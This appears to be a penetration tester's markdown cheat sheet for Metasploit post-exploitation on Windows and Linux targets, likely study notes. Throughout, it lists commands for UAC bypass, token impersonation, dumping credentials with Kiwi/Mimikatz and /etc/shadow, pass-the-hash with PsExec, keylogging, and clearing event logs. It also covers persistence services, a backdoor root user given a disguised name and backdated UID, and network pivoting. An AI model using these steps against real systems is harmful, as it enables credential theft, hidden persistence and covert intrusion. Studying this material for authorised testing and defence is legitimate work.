
process
=
1. local enum
2. priv esc
3. dumping hashes
4. establishing persistence
5. clearing your tracks
6. pivoting

Meterpreter
=
`help` - list of commands
`sessions -h `- help commands to perform on sessions
	-k - kill sessions
	-n rename session
	-u upgrade session to meterpreter
`download file`
`upload file`
`getenv path`
`getenv term`
`search` - search on target file system
	`-d` specifiy directory for search
`migrate pid` try on both linux and windows might get an easy privesc
`execute -f ifconfig` when commands wont work properly

Upgrading to meterpreter
=
msfvenom
shell_to_meterpreter - msfmodule
sessions -u id

Windows
=
## meterpreter

`sysinfo`
`getsystem`
`show_mount` - show drives
`migrate pid`
`getuid`
`hashdump`
`enumdesktops`
`screenshot`
`keyscan`

## cmd

`systeminfo` - extended system information and patches

## post modules 

`search type:post platform:windows`

`use windows/manage/migrate` - create and migrate to a new process
`use post/windows/gather/win_privs` enumerate user privileges
`use post/windows/gather/enum_logged_on_users`
`use post/windows/gather/checkvm` - check whether you're in a virtual machine or not
`use post/windows/gather/enum_applications` - programs installed and their versions
`use post/windows/gather/enum_av_excluded` - check which folders are not scanned by av
`use post/windows/gather/enum_computers` - check if pc is part of a domain
`use post/windows/gather/enum_patches` - search for patches on operating system
`use post/windows/gather/enum_shares` - display current configured shares
`use post/windows/manage/enable_rdp` - enable rdp on the target

## Bypassing UAC

1. net users - see users of machine
2. net localgroup administrators - check if were part of administrators
3. background cmd
4. `search bypassuac` for a module
	1. make use of injection module
	2. set to correct payload to reflect 64 or 32 bit
	3. set correct target
5. use `getsystem` to pwn system and by pass uac
6. hashdump

## Token Impersonation (Incognito)

1. get meterpreter shell
2. `getprivs` - check our privileges, look for SeImpersonatePrivilege 
3. `load incognito`
4. `list_tokens -u `- look for token available
5. `impersonate_token` "token"
6. `migrate` to process run by the user you impersonated
7. `hashdump` for persistence

## Dumping hashes (Mimikatz/Kiwi)

extract plain text passwords from memory and from local SAM databases

need meterpreter shell

1. migrate to` pgrep lsass`
2. `load kiwi`
3. `creds_all`
4. `lsa_dump_sam`
5. `lsa_dump_secrets` - get syskey
6. use for pass the hash attack or crack ntlm hash

## Pass the hash with PsExec via SMB

1. get hashes from targer
2. `use exploit/windows/smb/psexec`
3. specify smbpass as hash (from number colon to last colon before multiple colons)
4. run

## Persistence

need root/admin user

`search platform:windows persistence` - persistence service module is best

try to give it a legit service name that blends in

1. `use windows/local/persistence_service`
2. set up and run
3. `use multi/handler`
4. set up multi/handler with same payload as persistence
5. run multi/handler

## Enabling RDP

get meterpreter session

1. `search enable_rdp`
2. run command on session
3. run a shell
4. find users `net users`
5. `net user administrator password` - change password of admin user
6. use legit credentials to login through rdp that was opened 

## Keylogging

`keyscan_start`
`keyscan_stop`
`keyscan_dump`

## Clearing event logs

Event Viewer Application - application, system, security

`clearev` - meterpreter command to clear logs

## Pivoting 

`run autoroute -s 10.10.10.0/CIDR` - use network id - meterpreter pivoting

only internal msfconsole tools/modules can be used on other targets routed through meterpreter

`portscan/tcp

`portfwd add -l localport -p target_port -r targets ipaddress` - portforward  target so we can use local tools outside of meterpreter - still need meterpreter shell active that routes

1. `ipconfig` - find the internal network id
2. run autoroute on network id
3. use modules to scan target or use meterpreter portfwd to forward the route to local machine and use tools on the localhost and port
4. may need to use bind payload rather than reverse tcp


Linux
=

1. enumerate system config, 
2. environment variables, 
3. network configuration, 
4. vm check, 
5. user history

can add user with add user command

can change root password with `root passwd` command

## commands

`group users`
`cat /etc/\*issue` - dist version
`uname -r` - kernal versin
`uname -a`
`ip a s`
`netstat -antp`
`ps aux` - processes run
`env`

## post modules

`search enum_configs` - configurations on system
`use post/multi/gather/env` - env variables
`search enum_network` - check network information, host providers
`search enum_protections` - check system hardening
`search enum_system` - use this
`search checkcontainer`
`search checkvm`
`search enum_user_history` - bash history of users
`search system_session`
`search download_exec`

## Vulnerable Programs

1. find dist version and check for vulns
2. check kernal version and check for vulns
3. use ps aux for processes run, might find something to exploit
4. look up name of programs running

## Dumping Hashes

use metasploit module ``

1. get meterpreter shell with root privs
2. `search hasdump platform:linux`
3. set session, run
4. it will spit out unshadowed password file
5. crack with john

manually
5. cat /etc/shadow
6.  cat /etc/passwd
7. then unshadow
8. crack with john

## Persistence

creating backdoor user (works if ssh is running or rpc)
1. `useradd -m ftp -s /bin/bash` - create backdoor user with clandestine name
2.  `passwd ftp`  init password
3. `usermod -aG root ftp` - adds backdoor user to root users
4. `usermod -u 15 ftp` - adjust user id to make it look like it was made long ago

`search platform:linux persistence` - use the modules for persistence, may need to read info of exploits and play around with targets and values

`ssh -i ssh_key root@ip`




